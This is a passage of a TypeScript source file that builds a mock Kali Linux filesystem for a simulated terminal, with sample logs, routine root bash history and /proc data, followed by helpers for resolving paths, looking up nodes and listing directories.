                  "access.log": { type: "file", content: "192.168.1.10 - - [23/Mar/2026:16:00:01 +0000] \"GET / HTTP/1.1\" 200 1234\n45.33.32.156 - - [23/Mar/2026:16:05:01 +0000] \"GET /admin HTTP/1.1\" 403 287\n45.33.32.156 - - [23/Mar/2026:16:05:02 +0000] \"POST /api/login HTTP/1.1\" 401 52", size: 280, permissions: "-rw-r-----", owner: "root", modified: "Mar 23 16:05" },
                  "error.log": { type: "file", content: "[Mon Mar 23 16:05:02.123456 2026] [error] [client 45.33.32.156:54321] AH01630: client denied by server configuration: /var/www/html/admin", size: 150, permissions: "-rw-r-----", owner: "root", modified: "Mar 23 16:05" },
                },
              },
              "weekly_scan.txt": { type: "file", content: "[Weekly Nmap scan results - see /home/kali/Documents/notes.md]", size: 60, permissions: "-rw-r--r--", owner: "root", modified: "Mar 16 00:00" },
            },
          },
          www: {
            type: "dir",
            children: {
              html: {
                type: "dir",
                children: {
                  "index.html": { type: "file", content: "<!DOCTYPE html><html><head><title>UCSF Security Portal</title></head><body><h1>Welcome</h1></body></html>", size: 105, permissions: "-rw-r--r--", owner: "www-data", modified: "Mar 15 00:00" },
                },
              },
            },
          },
        },
      },
      tmp: { type: "dir", children: {} },
      root: {
        type: "dir",
        children: {
          ".bashrc": { type: "file", content: "# root bashrc\nexport PS1='\\[\\033[01;31m\\]root@kali\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# '", size: 95, permissions: "-rw-r--r--", owner: "root", modified: "Jan 01 00:00" },
          ".bash_history": { type: "file", content: "apt update && apt upgrade -y\nsystemctl restart ssh\nufw enable\nufw allow 22/tcp\niptables -L", size: 95, permissions: "-rw-------", owner: "root", modified: "Mar 23 10:00" },
        },
      },
      proc: {
        type: "dir",
        children: {
          cpuinfo: { type: "file", content: "processor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel name\t: Intel(R) Core(TM) i9-13900K\nstepping\t: 1\ncpu MHz\t\t: 3000.000\ncache size\t: 36864 KB\ncpu cores\t: 24\nbogomips\t: 6000.00\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat", size: 280, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
          meminfo: { type: "file", content: "MemTotal:       32768000 kB\nMemFree:        18432000 kB\nMemAvailable:   24576000 kB\nBuffers:          512000 kB\nCached:          4096000 kB\nSwapTotal:       8192000 kB\nSwapFree:        8192000 kB\nActive:          8192000 kB\nInactive:        4096000 kB\nDirty:                32 kB", size: 300, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
          version: { type: "file", content: "Linux version 6.6.9-amd64 (kali@kali-dev) (gcc-13 (Debian 13.2.0-13) 13.2.0) #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2026-01-15)", size: 132, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
          uptime: { type: "file", content: "1209600.00 967680.00", size: 20, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
          loadavg: { type: "file", content: "0.52 0.38 0.31 1/142 3456", size: 26, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
          "net": {
            type: "dir",
            children: {
              "tcp": { type: "file", content: "  sl  local_address rem_address   st tx_queue rx_queue\n   0: 0100007F:0016 00000000:0000 0A 00000000:00000000\n   1: 0100007F:0050 00000000:0000 0A 00000000:00000000", size: 200, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
              "udp": { type: "file", content: "  sl  local_address rem_address   st tx_queue rx_queue\n   0: 00000000:0044 00000000:0000 07 00000000:00000000", size: 130, permissions: "-r--r--r--", owner: "root", modified: "Mar 23 00:00" },
            },
          },
        },
      },
      dev: {
        type: "dir",
        children: {
          null: { type: "file", content: "", size: 0, permissions: "crw-rw-rw-", owner: "root", modified: "Mar 23 00:00" },
          zero: { type: "file", content: "", size: 0, permissions: "crw-rw-rw-", owner: "root", modified: "Mar 23 00:00" },
          random: { type: "file", content: "", size: 0, permissions: "crw-rw-rw-", owner: "root", modified: "Mar 23 00:00" },
          urandom: { type: "file", content: "", size: 0, permissions: "crw-rw-rw-", owner: "root", modified: "Mar 23 00:00" },
          sda: { type: "file", content: "", size: 0, permissions: "brw-rw----", owner: "root", modified: "Mar 23 00:00" },
          sda1: { type: "file", content: "", size: 0, permissions: "brw-rw----", owner: "root", modified: "Mar 23 00:00" },
        },
      },
      opt: {
        type: "dir",
        children: {
          "google": { type: "dir", children: {} },
        },
      },
      sys: {
        type: "dir",
        children: {
          "class": {
            type: "dir",
            children: {
              net: {
                type: "dir",
                children: {
                  eth0: { type: "dir", children: {} },
                  lo: { type: "dir", children: {} },
                  wlan0: { type: "dir", children: {} },
                },
              },
            },
          },
        },
      },
      run: {
        type: "dir",
        children: {
          "sshd.pid": { type: "file", content: "234", size: 3, permissions: "-rw-r--r--", owner: "root", modified: "Mar 09 12:00" },
        },
      },
      boot: {
        type: "dir",
        children: {
          "vmlinuz-6.6.9-amd64": { type: "file", content: "[Linux kernel image]", size: 12000000, permissions: "-rw-r--r--", owner: "root", modified: "Jan 15 00:00" },
          "initrd.img-6.6.9-amd64": { type: "file", content: "[Initial ramdisk]", size: 45000000, permissions: "-rw-r--r--", owner: "root", modified: "Jan 15 00:00" },
          "grub": { type: "dir", children: {} },
        },
      },
      media: { type: "dir", children: {} },
      mnt: { type: "dir", children: {} },
      srv: { type: "dir", children: {} },
    },
  },
});

export const resolvePath = (cwd: string, target: string): string => {
  if (target.startsWith("/")) {
    return normalizePath(target);
  }
  if (target === "~") return "/home/kali";
  if (target.startsWith("~/")) return normalizePath("/home/kali/" + target.slice(2));
  return normalizePath(cwd + "/" + target);
};

const normalizePath = (path: string): string => {
  const parts = path.split("/").filter(Boolean);
  const resolved: string[] = [];
  for (const p of parts) {
    if (p === ".") continue;
    if (p === "..") { resolved.pop(); continue; }
    resolved.push(p);
  }
  return "/" + resolved.join("/");
};

export const getNode = (fs: Record<string, FSNode>, path: string): FSNode | null => {
  if (path === "/") return fs["/"];
  const parts = path.split("/").filter(Boolean);
  let current = fs["/"];
  for (const part of parts) {
    if (current.type !== "dir" || !current.children?.[part]) return null;
    current = current.children[part];
  }
  return current;
};

export const getParentAndName = (fs: Record<string, FSNode>, path: string): { parent: FSNode | null; name: string } => {
  const parts = path.split("/").filter(Boolean);
  const name = parts.pop() || "";
  const parentPath = "/" + parts.join("/");
  return { parent: getNode(fs, parentPath), name };
};

export const formatSize = (size: number): string => {
  if (size >= 1073741824) return (size / 1073741824).toFixed(1) + "G";
  if (size >= 1048576) return (size / 1048576).toFixed(1) + "M";
  if (size >= 1024) return (size / 1024).toFixed(1) + "K";
  return size.toString();
};

export const listDirRecursive = (fs: Record<string, FSNode>, path: string, maxDepth = 3, currentDepth = 0): string[] => {
  if (currentDepth >= maxDepth) return [];
  const node = getNode(fs, path);
  if (!node || node.type !== "dir" || !node.children) return [];
  const results: string[] = [];
  for (const [name, child] of Object.entries(node.children)) {
    const fullPath = path === "/" ? `/${name}` : `${path}/${name}`;
    results.push(fullPath);
    if (child.type === "dir") {
      results.push(...listDirRecursive(fs, fullPath, maxDepth, currentDepth + 1));
    }
  }
  return results;
};
